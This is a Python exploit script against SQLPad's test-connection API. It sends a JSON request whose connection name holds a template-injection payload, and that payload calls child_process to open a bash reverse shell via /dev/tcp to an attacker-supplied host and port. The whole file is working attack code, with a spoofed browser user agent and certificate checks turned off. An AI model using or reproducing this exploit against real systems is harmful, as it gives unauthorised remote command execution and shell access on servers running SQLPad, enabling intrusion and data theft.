import requests
import urllib3
import argparse

def main():
    argParser = argparse.ArgumentParser()
    argParser.add_argument("-u", "--url", type=ascii, help="api/test-connection URL for vulnerable SQLPad", required=True)
    argParser.add_argument("-a", "--attacker", type=ascii, help="host listening for reverse TCP shell", required=True)
    argParser.add_argument("-p", "--port", type=ascii, help="port listening for reverse TCP shell", required=True)
    args = argParser.parse_args()

    urllib3.disable_warnings()

    req_headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }

    target_url = args.url.replace("'", "")
    reverse_host = args.attacker.replace("'", "")
    reverse_port = args.port.replace("'", "")

    print("[*] Running exploit against target: " + target_url)

    # Reverse shell using bash
    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{reverse_host}/{reverse_port} 0>&1\"') }}}}"

    print("[*] Payload = " + payload)
    print("[*] Assembling JSON with payload")

    post_data = {
        "name": payload,
        "driver": "mysql",
        "idleTimeoutMinutes": None,  # Fixed the issue here
        "multiStatementTransactionEnabled": None,  # Fixed the issue here
        "data": {
            "host": "localhost"
        },
        "host": "localhost"
    }

    print("[*] Submitting request...")

    result = requests.post(target_url, json=post_data, verify=False, headers=req_headers, allow_redirects=True)
    print('result status_code: ' + str(result.status_code))
    print('result: ' + result.text)

    print("[*] Done.")

if __name__ == '__main__':
    main()

